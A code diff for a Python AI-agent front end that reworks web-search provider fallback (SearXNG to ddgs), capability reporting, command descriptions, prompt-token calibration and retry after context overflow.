@@ -11312,7 +12747,7 @@ WEB_SEARCH_REGISTRY = web_search.default_registry()
 
 def _web_search_limit() -> int:
     try:
-        return max(1, min(int(APP_CONFIG.get("web_search_results", "5")), 20))
+        return max(1, min(_config_int("web_search_results", 5), 20))
     except (TypeError, ValueError):
         return 5
 
@@ -11320,7 +12755,7 @@ def _web_search_limit() -> int:
 def _web_search_turn_cap() -> int:
     """Searches one request may run before it must answer; 0 means no cap."""
     try:
-        return max(0, int(APP_CONFIG.get("web_search_max_per_turn", "6")))
+        return max(0, _config_int("web_search_max_per_turn", 6))
     except (TypeError, ValueError):
         return 6
 
@@ -11486,6 +12921,13 @@ def _local_searxng_no_prompt_enabled() -> bool:
     # not disagree about what the configured value means.
     if str(config.get("web_search_provider") or "").strip().lower() != "searxng":
         return False
+    return _search_base_url_is_local(config)
+
+
+def _search_base_url_is_local(config=None) -> bool:
+    """Is search_base_url a loopback or explicitly allowlisted private-LAN
+    SearXNG? Queries sent there do not leave the operator's network."""
+    config = _search_config() if config is None else config
     base_url = str(config.get("search_base_url") or "")
     try:
         import ipaddress
@@ -11591,15 +13033,20 @@ def resolve_auto_search_provider(probe=None) -> str:
     path safe (see _local_searxng_no_prompt_enabled — it requires a searxng pin
     precisely because a chain could fall through to a public provider).
 
-    Consequence worth stating: when SearXNG is down the pick lands on ddgs, so
-    searches keep working but DO prompt, because the query now leaves the
-    network. Silent + external is the one combination this cannot give.
+    When SearXNG is down the pick lands on ddgs (reported as degraded in
+    capabilities.SEARCH), which needs no approval (_ddgs_only_chain). The pin
+    is auto's first choice, not its only one: _search_call_chain falls
+    through mid-session and _maybe_reprobe_searxng switches back up.
 
     Returns the resolved name ("" if nothing can serve). A no-op unless the
     configured value is AUTO, so calling it twice is harmless.
     """
     configured = str(APP_CONFIG.get("web_search_provider") or "").strip().lower()
     if configured != web_search.AUTO:
+        # Already resolved by auto earlier in this process (the web server's
+        # lifespan calls this again after cli.main did): keep auto's report.
+        if not _search_auto_active():
+            _report_search_pin(configured)
         return configured
     try:
         # Safe to build from the live config even though it still says "auto":
@@ -11612,9 +13059,211 @@ def resolve_auto_search_provider(probe=None) -> str:
                decision="allowed", detail=f"auto -> unresolved ({exc})")
         return web_search.AUTO
     APP_CONFIG["web_search_provider"] = picked
+    _SEARCH_AUTO["pin"] = picked
+    _SEARCH_AUTO["last_probe"] = time.monotonic()
     _audit("search_provider_resolved", tool="web_search", mode="search",
            decision="allowed", detail=f"auto -> {picked or 'none available'}")
+    _report_search_state(picked)
     return picked
+
+
+def set_search_provider(name: str) -> str:
+    """`/search use <name>` and POST /api/search/use: apply a choice for this
+    process. AUTO is resolved on the spot (same as at startup), so the web UI
+    no longer stores a bare "auto" that runs the whole chain and prompts on
+    every search. Persisting to config.txt is the caller's job. Returns the
+    name now in effect."""
+    name = str(name or "").strip().lower()
+    APP_CONFIG["web_search_provider"] = name
+    _SEARCH_AUTO["pin"] = ""
+    if name == web_search.AUTO:
+        return resolve_auto_search_provider()
+    capabilities.clear(capabilities.SEARCH)
+    _report_search_pin(name)
+    return name
+
+
+# ---------------------------------------------------------------------------
+# Web search — capability state and the auto fallback (see capabilities.py)
+# ---------------------------------------------------------------------------
+SEARCH_DDGS_IMPACT = "keyless scraper: results can be incomplete, throttled or less relevant"
+SEARCH_DDGS_NOTE = ("[note: served by ddgs (keyless fallback) — coverage may be incomplete; "
+                    "cross-check important facts or try a narrower query]")
+
+# What auto resolved to. "pin" is the concrete backend auto picked ("" when
+# auto is not in effect: an explicit pin, or nothing could serve);
+# last_probe is when SearXNG was last probed (time.monotonic()).
+_SEARCH_AUTO = {"pin": "", "last_probe": 0.0}
+
+
+def _search_auto_active() -> bool:
+    """Is the current pin auto's choice (rather than an explicit pin)?"""
+    pin = _SEARCH_AUTO["pin"]
+    return bool(pin) and str(APP_CONFIG.get("web_search_provider") or "").strip().lower() == pin
+
+
+def _set_auto_pin(name: str, why: str) -> None:
+    APP_CONFIG["web_search_provider"] = name
+    _SEARCH_AUTO["pin"] = name
+    _SEARCH_AUTO["last_probe"] = time.monotonic()
+    _audit("search_provider_resolved", tool="web_search", mode="search",
+           decision="allowed", detail=f"auto -> {name} ({why})")
+
+
+def _search_upgrade_fix() -> str:
+    if shutil.which("docker"):
+        return "/search setup, or set TAVILY_API_KEY/EXA_API_KEY"
+    return "/search setup (needs Docker) or set TAVILY_API_KEY/EXA_API_KEY"
+
+
+def _ddgs_fallback_reason() -> str:
+    """Why ddgs is serving instead of SearXNG. No network: startup-safe."""
+    if SEARCH_BASE_URL_CONFIGURED and str(_search_config().get("search_base_url") or "").strip():
+        return "SearXNG not answering"
+    if not shutil.which("docker"):
+        return "no SearXNG; Docker not found"
+    return "no SearXNG configured"
+
+
+def _report_search_state(active: str, *, reason: str = "") -> None:
+    """Report capabilities.SEARCH for the backend now serving ("" = none)."""
+    C = capabilities
+    if active == "ddgs":
+        C.report(C.SEARCH, active="ddgs", preferred="searxng", state=C.DEGRADED,
+                 reason=reason or _ddgs_fallback_reason(), impact=SEARCH_DDGS_IMPACT,
+                 fix=_search_upgrade_fix(), model_note=SEARCH_DDGS_NOTE)
+    elif active:
+        C.report(C.SEARCH, active=active, preferred=active, state=C.OK, reason=reason)
+    else:
+        C.report(C.SEARCH, active="", preferred="searxng", state=C.UNAVAILABLE,
+                 reason=reason or "no web search backend can serve",
+                 impact="web_search fails; answers rely on training data",
+                 fix="/doctor --fix (reinstalls ddgs) or /search setup")
+
+
+def _report_search_pin(name: str) -> None:
+    """State for an explicit pin, without touching the network: only a ddgs
+    pin is known-limited up front; any other pin is judged by its searches."""
+    if name == "ddgs":
+        capabilities.report(capabilities.SEARCH, active="ddgs", preferred="",
+                            state=capabilities.DEGRADED,
+                            reason="pinned: web_search_provider=ddgs",
+                            impact=SEARCH_DDGS_IMPACT, model_note=SEARCH_DDGS_NOTE,
+                            fix="/search use auto, or " + _search_upgrade_fix())
+
+
+def _searxng_failed(report) -> bool:
+    """Did SearXNG actually fail in this call (not merely find nothing)?"""
+    return any(f.startswith("searxng: ") and f != "searxng: no results"
+               for f in report.failures)
+
+
+def _report_search_outcome(report, *, fallback_reason: str = "") -> None:
+    """Update capabilities.SEARCH from one call; switch auto's pin off a dead SearXNG.
+
+    A transient failure with nothing served (ddgs throttled once) leaves the
+    state alone — flipping to "unavailable" and back on every hiccup would be
+    noise. A SearXNG that really failed is recorded either way.
+    """
+    try:
+        served = report.provider
+        if served:
+            if served == "ddgs":
+                entry = capabilities.get(capabilities.SEARCH)
+                reason = (fallback_reason
+                          or ("SearXNG stopped answering" if _searxng_failed(report) else ""))
+                already = (entry is not None and entry.active == "ddgs"
+                           and entry.state == capabilities.DEGRADED)
+                if reason or not already:  # else keep the existing reason and fix
+                    _report_search_state("ddgs", reason=reason)
+            else:
+                _report_search_state(served)
+            if (_search_auto_active() and _SEARCH_AUTO["pin"] == "searxng"
+                    and served != "searxng" and _searxng_failed(report)):
+                # SearXNG's failure mode is "the instance is down", so stop
+                # trying it first on every call; _maybe_reprobe_searxng brings
+                # it back. Keyed backends are not unpinned: their failures
+                # (429, a 5xx) are transient and they fall through per call.
+                _set_auto_pin(served, "SearXNG stopped answering")
+        elif _searxng_failed(report):
+            capabilities.report(
+                capabilities.SEARCH, active="", preferred="searxng",
+                state=capabilities.UNAVAILABLE, reason="SearXNG not answering",
+                impact="searches fail or ask before using public ddgs",
+                fix="/search setup, or /search use auto to fall back to ddgs")
+    except Exception:  # noqa: BLE001 — bookkeeping must never fail a search
+        _log.debug("search capability report failed", exc_info=True)
+
+
+def _search_call_chain(context, *, prompt_free: bool):
+    """Providers for one call under auto: the pin, then the rest of the auto order.
+
+    prompt_free: this call skipped the approval gate on an exemption (ddgs-only
+    chain, or local SearXNG with web_search_no_prompt=1). It may then only fall
+    through to backends that need no approval either — ddgs, or a local
+    SearXNG — never to a keyed vendor or a remote instance the operator never
+    approved this query for.
+    """
+    pin = _SEARCH_AUTO["pin"]
+    rest = [n for n in WEB_SEARCH_REGISTRY.auto_order(context) if n != pin]
+    if prompt_free:
+        rest = [n for n in rest
+                if n == "ddgs" or (n == "searxng" and _search_base_url_is_local())]
+    providers = [WEB_SEARCH_REGISTRY.get(n) for n in [pin, *rest]]
+    return [p for p in providers if p is not None]
+
+
+def _maybe_reprobe_searxng(probe=None, now=None) -> bool:
+    """Under auto, switch back up to SearXNG once it answers again.
+
+    Cheap and rate-limited: at most one probe per web_search_reprobe_seconds
+    (default 300, 0 disables), only while auto's pin is a backend ranked BELOW
+    SearXNG (ddgs). Returns True when it upgraded.
+    """
+    try:
+        if not _search_auto_active() or _SEARCH_AUTO["pin"] == "searxng":
+            return False
+        interval = max(0, _config_int("web_search_reprobe_seconds", 300))
+        if interval <= 0:
+            return False
+        now = time.monotonic() if now is None else now
+        if now - _SEARCH_AUTO["last_probe"] < interval:
+            return False
+        context = _search_context()
+        order = WEB_SEARCH_REGISTRY.auto_order(context)
+        pin = _SEARCH_AUTO["pin"]
+        if "searxng" not in order or (pin in order and order.index(pin) < order.index("searxng")):
+            return False
+        _SEARCH_AUTO["last_probe"] = now
+        if not (probe or web_search.probe_searxng)(context):
+            return False
+    except Exception:  # noqa: BLE001 — a probe must never fail a search
+        return False
+    _set_auto_pin("searxng", "SearXNG answering again")
+    _report_search_state("searxng", reason="SearXNG answering again")
+    return True
+
+
+def _run_web_search(query, config, context, images, chain=None):
+    """run_search -> SearchReport, tolerating embedders' and tests' stand-ins
+    that still return a plain string or a (text, failures) tuple."""
+    out = web_search.run_search(query, _web_search_limit(), WEB_SEARCH_REGISTRY, config,
+                                context, images=images, chain=chain, return_report=True)
+    if isinstance(out, web_search.SearchReport):
+        return out
+    if isinstance(out, tuple):
+        text, failed = str(out[0]), tuple(out[1])
+    else:
+        text, failed = str(out), ()
+    match = re.search(r"Search results \(via (\w+)\)", text)
+    return web_search.SearchReport(text=text, provider=match.group(1) if match else "",
+                                   failed=failed)
+
+
+def _with_search_note(report) -> str:
+    """The result text plus the SEARCH caveat when the keyless fallback served."""
+    note = capabilities.model_note(capabilities.SEARCH) if report.provider == "ddgs" else ""
+    return f"{report.text}\n{note}" if note else report.text
 
 
 def _search_chain_summary() -> str:
@@ -11654,6 +13303,29 @@ def _on_off(value, unit: str = "") -> str:
     return f"{value}{unit}"
 
 
+_COMMAND_IS_TYPED = ("This is a command the user types at the Agent8088 prompt. It is not "
+                     "a tool you can call; tell the user to type it.")
+
+
+def _close_commands(name: str, cutoff: float = 0.6) -> list:
+    import difflib
+    return difflib.get_close_matches(name.lower(), FRONTEND_COMMANDS, n=3, cutoff=cutoff)
+
+
+def _describe_command(name: str) -> str:
+    """describe_tool for a front-end command -- or for one that does not exist."""
+    key = name.strip().lower()
+    if key in FRONTEND_COMMANDS:
+        usage, description, details = FRONTEND_COMMANDS[key]
+        return json.dumps({"command": f"/{key}", "usage": usage, "description": description,
+                           "details": details, "how_to_use": _COMMAND_IS_TYPED},
+                          ensure_ascii=False, indent=2)
+    close = _close_commands(key)
+    hint = f" Did you mean {', '.join('/' + c for c in close)}?" if close else ""
+    return (f"No /{key} command exists in this Agent8088 front end.{hint} "
+            "Do not describe one that does not exist.")
+
+
 def describe_tool(tool_name, specs=None) -> str:
     """Return one live tool schema without executing the described tool.
 
@@ -11666,6 +13338,8 @@ def describe_tool(tool_name, specs=None) -> str:
     if not isinstance(tool_name, str) or not tool_name.strip() or len(tool_name) > 200:
         return "Error: Provide one exact tool name, e.g. read_text. Use /tools to list available names."
     name = tool_name.strip()
+    if name.startswith("/") or (name not in registry and name.lower() in FRONTEND_COMMANDS):
+        return _describe_command(name.lstrip("/"))
     spec = registry.get(name)
     if spec is None:
         return f"Error: Unknown or unavailable tool {name!r}. Use /tools to list available names. No tool was executed."
@@ -11682,6 +13356,13 @@ def describe_tool(tool_name, specs=None) -> str:
         "execution": ("Schema loaded; this tool is callable. Invoke it by name with these "
                       "parameters. Describing it did not run it; normal permissions apply."),
     }, ensure_ascii=False, indent=2))
+
+
+def _limited_suffix(name: str) -> str:
+    entry = capabilities.get(name)
+    if entry is None or entry.ok:
+        return ""
+    return f" ({entry.state}: {entry.reason or entry.active})"
 
 
 def describe_capabilities() -> str:
@@ -11734,6 +13415,12 @@ def describe_capabilities() -> str:
                 lines.append(f"    - {mcp_tool}")
     lines.append("")
 
+    if FRONTEND_COMMANDS:
+        lines.append(f"## Commands the user can type ({len(FRONTEND_COMMANDS)})")
+        lines.extend(f"- /{name}: {description}"
+                     for name, (_, description, _) in sorted(FRONTEND_COMMANDS.items()))
+        lines.append("")
+
     # --- Skills and subagents ---
     lines.append(f"## Skills ({len(SKILL_PACKAGES)})")
     lines += [f"- {s}" for s in sorted(SKILL_PACKAGES)] or ["- none installed"]
@@ -11744,6 +13431,18 @@ def describe_capabilities() -> str:
     lines.append("")
     lines.append(f"## Subagents ({len(SUBAGENT_SPECS)})")
     lines += [f"- {a}" for a in sorted(SUBAGENT_SPECS)] or ["- none configured"]
+    lines.append("")
+
+    # --- What is running on a fallback right now (capabilities registry) ---
+    limited = capabilities.degraded()
+    lines.append("## Limited right now")
+    if not limited:
+        lines.append("- nothing — every reported capability is on its preferred backend")
+    for entry in limited:
+        detail = "; ".join(p for p in (entry.reason, entry.impact) if p)
+        fix = f" (upgrade: {entry.fix})" if entry.fix else ""
+        lines.append(f"- {entry.label}: {entry.state}, using {entry.active or 'nothing'}"
+                     f"{' — ' + detail if detail else ''}{fix}")
     lines.append("")
 
     # --- Guardrails. Reporting what is OFF is as useful as what is on. ---
@@ -11761,7 +13460,7 @@ def describe_capabilities() -> str:
         f"- Writes per turn: {_on_off(MAX_WRITES_PER_TURN)}",
         f"- Max bytes per write: {_on_off(MAX_WRITE_BYTES)}",
         f"- New generated files: {ARTIFACTS_ROOT}",
-        f"- Web search: {_search_chain_summary()}",
+        f"- Web search: {_search_chain_summary()}{_limited_suffix(capabilities.SEARCH)}",
         f"- Egress allowlist: {', '.join(EGRESS_ALLOWED_DOMAINS) or 'not set (all public hosts reachable)'}",
         f"- Egress blocklist: {', '.join(EGRESS_BLOCKED_DOMAINS) or 'not set'}",
         f"- Shell allowlist: {', '.join(_USER_ALLOW_GLOBS) or 'not set'}",
@@ -11952,6 +13651,10 @@ def run_agent(messages, *, budget=None, memory_identity=None, memory_run_id=None
     neither recalls nor writes.
     """
     global _active_budget
+    if _active_budget is None:
+        # MCP servers connect in the background at startup; their tools must be
+        # registered before this turn's tool list is built.
+        ensure_mcp_ready()
     user_turns = _genuine_user_turns(messages)
     goal = str(user_turns[-1].get("content") or "") if user_turns else ""
     run_trajectory = trajectory.TrajectoryState(
@@ -12071,6 +13774,8 @@ def run_agent(messages, *, budget=None, memory_identity=None, memory_run_id=None
             kwargs["spin"]("thinking...")
         kwargs["system_prompt"] = _recalled_memory_prompt(
             messages, kwargs.get("system_prompt"), identity=memory_identity)
+        kwargs["system_prompt"] = _mentioned_capabilities_prompt(
+            messages, kwargs.get("system_prompt"))
     answer = None
     try:
         with _running_on(messages):
@@ -12078,6 +13783,13 @@ def run_agent(messages, *, budget=None, memory_identity=None, memory_run_id=None
                 messages, budget=budget, trajectory=run_trajectory,
                 on_trajectory_state=trajectory_changed, **kwargs,
             )
+        return answer
+    except TurnBudgetExceeded as exc:
+        answer = _guard_answer(f"{exc}\n\nPartial result so far:\n{_last_tool_output[:1000] or '(none)'}")
+        if kwargs.get("on_answer"):
+            kwargs["on_answer"](answer)
+        if isinstance(kwargs.get("trace"), list):
+            kwargs["trace"].append({"type": "budget_exceeded", "content": str(exc)})
         return answer
     finally:
         run_trajectory.finish(answer)
@@ -12128,7 +13840,7 @@ REUSE_KNOWN_VERDICTS = APP_CONFIG.get("reuse_known_verdicts", "1") != "0"
 
 # Wide enough to be worth a turn, small enough that the window itself is not
 # then clamped — retrieval that gets truncated would just re-create the bug.
-_OUTPUT_WINDOW = max(500, int(APP_CONFIG.get("read_content_window_chars", "2400")))
+_OUTPUT_WINDOW = max(500, _config_int("read_content_window_chars", 2400))
 
 
 def _content_length(args: dict) -> int:
@@ -12614,9 +14326,6 @@ def _user_requested_tool(messages, name: str) -> bool:
     return False
 
 
-# Web fetching wearing a shell command as a disguise.
-_WEB_FETCH_SHELL = _SHELL_WEB_CLIENT
-
 # MCP tools whose name says they fetch. Name-based because MCP specs carry no
 # capability metadata to key off — see the docstring in _is_fetch_followup.
 _MCP_FETCH_NAME = re.compile(r"(?:search|fetch|browse|web|http|scrape)", re.IGNORECASE)
@@ -12646,7 +14355,7 @@ def _is_fetch_followup(messages, name: str, args: dict) -> bool:
                     or _user_requested_tool(messages, name))
     if name == "execute_shell":
         command = str(args.get("command") or "")
-        return bool(_WEB_FETCH_SHELL.search(command)) and not _user_requested_tool(
+        return _shell_fetches_web(command) and not _user_requested_tool(
             messages, "execute_shell")
     if (TOOL_SPECS.get(name) or {}).get("mode") == "mcp":
         return bool(_MCP_FETCH_NAME.search(name)) and not _user_requested_tool(
@@ -12662,7 +14371,7 @@ CLI_ANYTHING_EXTENSION_TURNS = 5
 # per-model limit (so it stays correct across mid-session model switches).
 # <=0 disables auto-compaction entirely, matching the opt-out convention used
 # elsewhere in this file for tunables.
-COMPACTION_THRESHOLD_PCT = int(APP_CONFIG.get("compaction_threshold_pct", "75"))
+COMPACTION_THRESHOLD_PCT = _config_int("compaction_threshold_pct", 75)
 # How many of the most recent messages survive a compaction untouched -- the
 # agent's active working set. The summary replaces everything older.
 COMPACTION_KEEP_MESSAGES = 6
@@ -12705,6 +14414,47 @@ def _estimate_tokens(chars: int) -> int:
     """Single chars->tokens conversion for every context estimate, so the
     ratio lives in one place (CHARS_PER_TOKEN) instead of a scattered // 4."""
     return int(chars / CHARS_PER_TOKEN)
+
+
+# The last real prompt size a server reported for a conversation, so the
+# context meter can anchor on it instead of guessing from characters alone:
+# {"messages_id", "provider", "model", "chars", "tokens"}. Keyed by the
+# conversation list's id() so a sub-agent's or side call's numbers never
+# calibrate the main session's meter.
+PROMPT_CALIBRATION: dict = {}
+
+
+def _record_prompt_calibration(messages, system_prompt, response, provider_name, model_name) -> None:
+    """Remember usage.prompt_tokens against the characters that were sent."""
+    try:
+        tokens = int(getattr(getattr(response, "usage", None), "prompt_tokens", 0) or 0)
+        if tokens <= 0:
+            return
+        PROMPT_CALIBRATION.clear()
+        PROMPT_CALIBRATION.update(
+            messages_id=id(messages), provider=provider_name or "", model=model_name or "",
+            chars=_estimate_context_chars(messages, system_prompt or ""), tokens=tokens)
+    except Exception:  # noqa: BLE001 — a meter must never fail a turn
+        pass
+
+
+def estimate_prompt_tokens(messages, system_prompt: str = "", provider_name: str = "",
+                           model_name: str = "") -> int:
+    """Prompt tokens for `messages`, calibrated by the last real usage when
+    the server reported one for this same conversation and model: the real
+    count for what was sent then, plus a CHARS_PER_TOKEN estimate for what
+    was added since (or the real tokens-per-char ratio after a compaction
+    shrank it). Otherwise the plain CHARS_PER_TOKEN estimate."""
+    chars = _estimate_context_chars(messages, system_prompt or "")
+    cal = PROMPT_CALIBRATION
+    provider_name = provider_name or ACTIVE_PROVIDER or DEFAULT_PROVIDER or ""
+    model_name = model_name or MODEL_NAME or ""
+    if (cal.get("tokens") and cal.get("chars") and cal.get("messages_id") == id(messages)
+            and cal.get("model") == model_name and cal.get("provider") == provider_name):
+        if chars >= cal["chars"]:
+            return cal["tokens"] + _estimate_tokens(chars - cal["chars"])
+        return int(chars * cal["tokens"] / cal["chars"])
+    return _estimate_tokens(chars)
 
 
 def compact_messages(messages: list[dict], keep: int = COMPACTION_KEEP_MESSAGES,
@@ -12755,6 +14505,62 @@ def compact_messages(messages: list[dict], keep: int = COMPACTION_KEEP_MESSAGES,
     messages[:] = [{"role": "system", "content": "Conversation summary:\n" + summary},
                    *pinned, *recent]
     return True
+
+
+_DROPPED_TOOL_OUTPUT = "[older tool output removed to fit the model's context window]"
+
+
+def _drop_old_tool_output(messages: list[dict], keep: int = 2, head_chars: int = 300) -> int:
+    """Cut every long tool result except the last `keep` messages to its head.
+
+    The fallback when a context overflow cannot be summarised away (the
+    summary call itself overflows, or the history is too short to compact):
+    old tool output is the bulk of a long run and the part the model needs
+    least. Mutates in place, like compact_messages. Returns how many shrank.
+    """
+    shrunk = 0
+    for message in messages[:-keep] if keep else messages:
+        content = message.get("content")
+        if (message.get("role") != "user" or not isinstance(content, str)
+                or len(content) <= head_chars * 2
+                or not content.startswith(_LOOP_PREFIXES)
+                or _DROPPED_TOOL_OUTPUT in content):
+            continue
+        message["content"] = content[:head_chars].rstrip() + "\n" + _DROPPED_TOOL_OUTPUT
+        shrunk += 1
+    return shrunk
+
+
+def _retry_after_context_overflow(messages, error, *, call, spin, trace, turn, budget,
+                                  loop_client, loop_provider, loop_model, max_tokens):
+    """Shrink the history after a context-overflow rejection and retry once.
+
+    Returns (response, None) on success, or (None, error) with the error to
+    report -- the original one when nothing could be shrunk.
+    """
+    _log.warning("context overflow at turn %d: %s", turn, error)
+    shrunk = False
+    try:
+        shrunk = compact_messages(messages, completion_client=loop_client,
+                                  provider_name=loop_provider or "",
+                                  model_name=loop_model or "", budget=budget)
+    except (AgentInterrupted, TurnBudgetExceeded):
+        raise
+    except Exception as exc:  # noqa: BLE001 -- the summary call may overflow too
+        _log.warning("compaction after context overflow failed: %s", exc)
+    if not shrunk:
+        shrunk = _drop_old_tool_output(messages) > 0
+    if trace is not None:
+        trace.append({"turn": turn, "type": "context_overflow_recovery", "ok": shrunk})
+    if not shrunk:
+        return None, error
+    try:
+        with spin("thinking..."):
+            return call(max(MIN_TURN_COMPLETION_TOKENS, (max_tokens or 0) // 2)), None
+    except (AgentInterrupted, TurnBudgetExceeded):
+        raise
+    except Exception as retry_error:  # noqa: BLE001 -- reported by the caller
+        return None, retry_error
 
 
 def _cli_anything_requested(messages: list[dict]) -> bool:
@@ -12906,7 +14712,7 @@ def _answer_from_context(messages, *, system_prompt, temperature, budget, on_tok
             trace=trace, turn=turn, client_override=client,
             provider_override=provider_name, model_override=model_name,
         )
-    except AgentInterrupted:
+    except (AgentInterrupted, TurnBudgetExceeded):
         raise
     except Exception as exc:
         _log.info("final wrap-up round failed: %s", exc)
@@ -12926,7 +14732,10 @@ DELIVERABLES_CHECK_NUDGE = (
     "and behaves exactly as specified. Remove scratch files, test users and other "
     "leftovers you created that the task did not ask for. Then give your final answer."
 )
-_REPEAT_RERUNS = frozenset({"cli_anything", "browser"})
+_REPEAT_OBSERVATIONS = frozenset({
+    "cli_anything_status", "cli_anything_list", "cli_anything_search",
+    "cli_anything_info", "cli_anything_skill",
+})
 _WAIT_COMMAND_RE = re.compile(r"(?:^|[\s;&|(])sleep\s+\d")
 
 
@@ -12967,7 +14776,8 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
                     system_prompt=None, tools_def=None, allowed_tools=None,
                     depth=0, budget=None, client=None, provider_name=None,
                     model_name=None, dynamic_turns=True, trajectory=None,
-                    on_trajectory_state=None, tool_loader=None, tool_searcher=None):
+                    on_trajectory_state=None, tool_loader=None, tool_searcher=None,
+                    on_status=None, on_stream_reset=None):
     global _last_auto_rung
     """Drive the model until it gives a final answer or hits max_turns.
 
@@ -12980,16 +14790,29 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
       on_answer(answer) -> with the final answer (or the fallback)
       on_token(kind, delta) -> streaming: called per token ('reasoning' or 'content')
       interrupt_check()  -> returns True if the user interrupted (e.g. ESC); raises AgentInterrupted
+      on_status(message) -> transient progress, e.g. "retrying in 4s (429) -- attempt 2/4";
+                            falls back to on_result("error", message) when not given
+      on_stream_reset()  -> a reply that broke off mid-stream is being retried: discard
+                            the partial text already rendered from on_token
     Pass a list as `trace` to collect a step-by-step record for training data.
     Returns the final answer string.
     """
     spin = spin or (lambda msg: nullcontext())
+
+    def _retry_notice(message):
+        if on_status:
+            on_status(message)
+        elif on_result:
+            on_result("error", message)
+
+    overflow_recovery_used = False  # one shrink-and-retry per run, never a loop
     if system_prompt is None:
         system_prompt = lambda: current_system_prompt() + render_task_skill_docs(
             messages, allowed_tools() if callable(allowed_tools) else allowed_tools)
     tools_def = tools_def if tools_def is not None else TOOLS_DEF
     allowed_tools = allowed_tools if allowed_tools is not None else TOOL_NAMES
     last_completed = None  # consecutive identical call -> (signature, output)
+    action_results = {}  # opaque external actions cannot be replayed within this request
     seen_signatures = set()  # every call this run has already made, for the policy
     read_results = {}  # bounded to this run; invalidated by non-read operations
     tool_outputs = [] # completed outputs, preserved if a loop forces fallback
@@ -13228,64 +15051,86 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
                     client_override=loop_client,
                     provider_override=loop_provider,
                     model_override=loop_model,
+                    on_retry=_retry_notice, on_stream_reset=on_stream_reset,
                 )
-        except AgentInterrupted:
+        except (AgentInterrupted, TurnBudgetExceeded):
             raise
         except Exception as e:
-            # A hard, non-retryable error (a renamed/deprecated model id, an
-            # invalid key) raises straight through _create_completion_with_fallback
-            # without ever trying an alternative -- see _retryable_model_error,
-            # which only matches transport failures. Under `auto` that must not
-            # mean "the turn dies": try the remaining rungs before giving up.
-            # Bounded by chain length, so this can never loop indefinitely.
-            if _round_is_auto:
-                routing.mark_cooldown(loop_provider, loop_model, 3600)
-                if trace is not None:
-                    trace.append({"turn": turn, "type": "model_escalation",
-                                  "reason": "hard_error", "detail": str(e)[:200]})
-                response = None
-                for _ in range(len(_auto_chain) - 1):
-                    _picked = routing.select(_auto_chain, auto_rung)
-                    if _picked is None:
-                        break
-                    auto_rung, loop_provider, loop_model = _picked
-                    _last_auto_rung = auto_rung
-                    try:
-                        loop_client, _ = get_client(loop_provider)
-                        with spin("thinking..."):
-                            response = _create_completion_with_fallback(
-                                messages, round_tools_def, temperature=temperature,
-                                system_prompt=round_system_prompt, on_token=on_token,
-                                interrupt_check=interrupt_check, trace=trace, turn=turn,
-                                max_tokens=turn_max_tokens,
-                                client_override=loop_client,
-                                provider_override=loop_provider,
-                                model_override=loop_model,
-                            )
-                        break
-                    except AgentInterrupted:
-                        raise
-                    except Exception as retry_error:
-                        routing.mark_cooldown(loop_provider, loop_model, 3600)
-                        e = retry_error
-                        continue
-                if response is None:
+            response = None
+            if is_context_overflow(e) and not overflow_recovery_used:
+                # The server says the prompt does not fit -- our chars/token
+                # estimate undershot. Shrink the history once and retry once;
+                # a second overflow goes to the error answer below, never a loop.
+                overflow_recovery_used = True
+                response, e = _retry_after_context_overflow(
+                    messages, e, spin=spin, trace=trace, turn=turn, budget=budget,
+                    loop_client=loop_client, loop_provider=loop_provider,
+                    loop_model=loop_model, max_tokens=turn_max_tokens,
+                    call=lambda tokens: _create_completion_with_fallback(
+                        messages, round_tools_def, temperature=temperature,
+                        system_prompt=round_system_prompt, on_token=on_token,
+                        interrupt_check=interrupt_check, trace=trace, turn=turn,
+                        max_tokens=tokens, client_override=loop_client,
+                        provider_override=loop_provider, model_override=loop_model,
+                        on_retry=_retry_notice, on_stream_reset=on_stream_reset))
+            if response is None:
+                # A hard, non-retryable error (a renamed/deprecated model id, an
+                # invalid key) raises straight through _create_completion_with_fallback
+                # without ever trying an alternative -- see _retryable_model_error,
+                # which only matches transport failures. Under `auto` that must not
+                # mean "the turn dies": try the remaining rungs before giving up.
+                # Bounded by chain length, so this can never loop indefinitely.
+                if _round_is_auto:
+                    routing.mark_cooldown(loop_provider, loop_model, 3600)
+                    if trace is not None:
+                        trace.append({"turn": turn, "type": "model_escalation",
+                                      "reason": "hard_error", "detail": str(e)[:200]})
+                    response = None
+                    for _ in range(len(_auto_chain) - 1):
+                        _picked = routing.select(_auto_chain, auto_rung)
+                        if _picked is None:
+                            break
+                        auto_rung, loop_provider, loop_model = _picked
+                        _last_auto_rung = auto_rung
+                        try:
+                            loop_client, _ = get_client(loop_provider)
+                            with spin("thinking..."):
+                                response = _create_completion_with_fallback(
+                                    messages, round_tools_def, temperature=temperature,
+                                    system_prompt=round_system_prompt, on_token=on_token,
+                                    interrupt_check=interrupt_check, trace=trace, turn=turn,
+                                    max_tokens=turn_max_tokens,
+                                    client_override=loop_client,
+                                    provider_override=loop_provider,
+                                    model_override=loop_model,
+                                    on_retry=_retry_notice, on_stream_reset=on_stream_reset,
+                                )
+                            break
+                        except (AgentInterrupted, TurnBudgetExceeded):
+                            raise
+                        except Exception as retry_error:
+                            routing.mark_cooldown(loop_provider, loop_model, 3600)
+                            e = retry_error
+                            continue
+                    if response is None:
+                        if trace is not None:
+                            trace.append(_model_error_step(turn, e))
+                        answer = _guard_answer(_fallback_answer(
+                            _last_tool_output, e, loop_provider or "", loop_model or ""))
+                        if on_answer:
+                            on_answer(answer)
+                        return answer
+                else:
+                    # Backend/model error (timeout, context overflow, 5xx): don't crash
+                    # the turn -- return the best we have, guarded. The trace step
+                    # keeps it from reading as an ordinary final answer.
                     if trace is not None:
                         trace.append(_model_error_step(turn, e))
-                    answer = _guard_answer(_fallback_answer(_last_tool_output, e))
+                    answer = _guard_answer(_fallback_answer(
+                            _last_tool_output, e, loop_provider or "", loop_model or ""))
                     if on_answer:
                         on_answer(answer)
                     return answer
-            else:
-                # Backend/model error (timeout, context overflow, 5xx): don't crash
-                # the turn -- return the best we have, guarded. The trace step
-                # keeps it from reading as an ordinary final answer.
-                if trace is not None:
-                    trace.append(_model_error_step(turn, e))
-                answer = _guard_answer(_fallback_answer(_last_tool_output, e))
-                if on_answer:
-                    on_answer(answer)
-                return answer
 
         # Strip chain-of-thought BEFORE storing: keeps runaway reasoning out of the
         # context window (the usual cause of the "loops in the reasoning block" crash)
@@ -13293,6 +15138,9 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
         message = response.choices[0].message
         if budget:
